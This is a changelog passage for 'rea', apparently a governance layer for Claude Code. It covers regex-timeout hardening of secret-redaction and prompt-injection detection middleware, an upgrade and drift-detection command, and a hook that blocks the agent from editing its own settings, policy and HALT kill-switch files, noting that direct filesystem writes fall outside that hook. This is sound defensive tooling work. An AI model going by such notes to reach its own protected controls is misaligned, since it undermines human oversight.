    returns a synchronous `SafeRegex` with `.test`, `.replace`, and
    `.matchAll` ops. Each call spawns a short-lived worker thread, blocks
    the parent on `Atomics.wait` over a SharedArrayBuffer, and drains the
    reply via `receiveMessageOnPort` after the worker notifies. On timeout
    the parent `terminate()`s the worker — a hard kill that stops a
    catastrophic `(a+)+$`-style pattern cold. Default timeout is 100ms.
  - `src/gateway/middleware/redact.ts` — all 12 `SECRET_PATTERNS` now flow
    through `SafeRegex`. New `createRedactMiddleware({ matchTimeoutMs?,
userPatterns? })` factory. On timeout the offending value is replaced
    with the sentinel `[REDACTED: pattern timeout]` — the scanner never
    lets an un-scanned string escape. Timeouts are recorded on
    `ctx.metadata[redact.regex_timeout]` as
    `{event, pattern_source, pattern_id, input_bytes, timeout_ms}` — the
    input text is NEVER written, only its byte length.
  - `src/gateway/middleware/injection.ts` — both injection regex constants
    (`INJECTION_BASE64_PATTERN`, `INJECTION_BASE64_SHAPE`) now flow through
    `SafeRegex`. Same audit-metadata contract under the key
    `injection.regex_timeout`.
  - `src/policy/loader.ts` — new `redact.match_timeout_ms?: number` (default 100) and `redact.patterns?: {name, regex, flags?}[]` policy fields. Every
    user-supplied pattern is passed through `safe-regex` at load time; a
    flagged pattern rejects the entire policy load with an error naming the
    offender. Schema stays strict — typos fail loudly.
  - `src/gateway/server.ts` — compiles user patterns via `wrapRegex` at
    gateway-create time and passes the configured timeout to both
    `createRedactMiddleware` and `createInjectionMiddleware`.
  - `scripts/lint-safe-regex.mjs` + `pnpm lint:regex` — static ReDoS check
    on every built-in pattern. Chained into `pnpm lint` BEFORE eslint so a
    bad regex short-circuits the pipeline. The existing "Private Key" PEM
    armor pattern was tightened to a bounded form that safe-regex accepts.
  - 24 new tests across `src/gateway/redact-safe/match-timeout.test.ts`
    (wrapRegex behavior: benign, catastrophic, replace-unchanged-on-timeout,
    onTimeout fire-once, default budget), `src/gateway/middleware/redact.test.ts`
    (middleware integration: sentinel substitution, metadata shape, no input
    leakage, invocation continues, nested-object preservation), and
    `src/policy/loader.test.ts` (schema round-trip, safe-regex rejection,
    compile-failure rejection, strict-mode field rejection).

  ## Upgrade path + drift detection (G12)

  Closes the central dogfood gap: consumer projects (including rea itself) had
  no way to pull in updates to shipped artifacts — `hooks/`, `commands/`,
  `agents/`, `.husky/`, the rea-owned subset of `.claude/settings.json`, and
  the managed CLAUDE.md fragment — without a manual re-install that risked
  trampling local edits.
  - `src/cli/install/manifest-schema.ts` — strict zod schema for
    `.rea/install-manifest.json`. Records SHA-256 of every shipped file plus
    two synthetic entries: `.claude/settings.json#rea:desired` (hash of the
    rea-owned hooks subset, NOT the full file — consumer-added hooks stay
    invisible) and `CLAUDE.md#rea:managed:v1` (hash of the managed fragment
    only). `bootstrap: true` flags manifests seeded on pre-G12 installs.
  - `src/cli/install/canonical.ts` — single source of truth for "what ships
    in this rea version". Walks `hooks/`, `agents/`, `commands/`, `.husky/`
    under the package root and emits sorted, POSIX-normalized destination
    paths. Adding a new hook under `.husky/` automatically joins the upgrade
    surface.
  - `src/cli/install/{sha,manifest-io}.ts` — SHA-256 helpers (buffer +
    streaming file), atomic read/write for the manifest with the same
    tmp+rename EEXIST/EPERM retry used by settings-merge.
  - `src/cli/upgrade.ts` + `rea upgrade` command — classifies each file as
    `new` / `unmodified` / `drifted` / `removed-upstream`. Unmodified files
    auto-update silently (the consumer never changed them). Drifted files
    prompt `keep | overwrite | diff` interactively; `--yes` defaults to keep
    (safe), `--force` defaults to overwrite. Removed-upstream files prompt
    delete/skip. Writes a fresh manifest with `upgraded_at` at the end.
    Bootstrap mode records on-disk SHAs as the baseline when no manifest
    exists — the NEXT upgrade then compares against canonical normally.
  - `rea init` now writes the manifest as its last step, recording SHAs of
    the files actually on disk (not canonical — so a skipped copy still has
    an accurate baseline).
  - `rea doctor --drift` — read-only drift report. Row statuses:
    `unmodified | drifted-from-canonical | drifted-from-manifest | missing | untracked | removed-upstream`.
    Never contributes to the doctor exit code; `rea upgrade` is the action
    path.
  - `scripts/postinstall.mjs` + `"postinstall"` script — prints a one-line
    stderr nudge pointing at `rea upgrade` when the installed rea version
    disagrees with the manifest version. Silent when `CI=true`, silent when
    no manifest exists, silent when versions match, silent when running
    inside the rea repo itself. Never fails the install — every code path
    returns 0.
  - Dogfood caveat: `settings-protection.sh` still blocks Write|Edit on
    `.husky/*`, `.claude/hooks/*`, `.claude/settings.json`, `.rea/policy.yaml`,
    and `.rea/HALT`. `rea upgrade` writes via direct `fs` calls rather than
    Claude Code tool invocations, so it must be run from a terminal outside
    a Claude Code session. This is intentional: upgrade is an
    authorized-human action by design.

  ## Packaging
  - `.husky/` added to `package.json#files[]` so consumer installs pick up the commit-msg source
  - `scripts/` added to `package.json#files[]` for the postinstall script
  - `"postinstall": "node scripts/postinstall.mjs"` registered
  - `./audit` export added to `package.json#exports`
  - `safe-regex@^2.1.1` + `@types/safe-regex@^1.1.6` added as dev dependencies for G3.

  ## Explicitly deferred to the full 0.2.0 cycle

  Audit-chain tamper / crash-recovery tests, 20-file integration matrix, npm
  trusted publisher (OIDC-only), Streamable-HTTP transport, auxiliary-model
  routing, threat-model refresh.

### Patch Changes

- 82a4ff7: Add CLAUDE.md to the rea repo root so Claude Code has project-level behavioral rules, policy references, delegation patterns, and non-negotiable safety gates in the dogfood install. Ships as part of the repo, not the npm package.
- 1e69005: Dogfood install uses conventional `.claude/` paths — real copies of agents, commands, and hooks instead of symlinks and source-dir references. This only affects the rea repo's own install; published package contents are unchanged.

## 0.1.0

### Minor Changes

- 66b09a0: Initial preview release of REA (Reactive Execution Agent). Governance layer for Claude Code with autonomy policy, middleware chain, HALT kill-switch, 11 Claude Code hooks, 5 slash commands, 10-agent curated roster, and first-class Codex plugin integration for adversarial code review.

  **Non-goals**: no PM layer, no Obsidian integration, no account management, no daemon supervisor, no hosted service. REA replaces `@bookedsolid/reagent`.
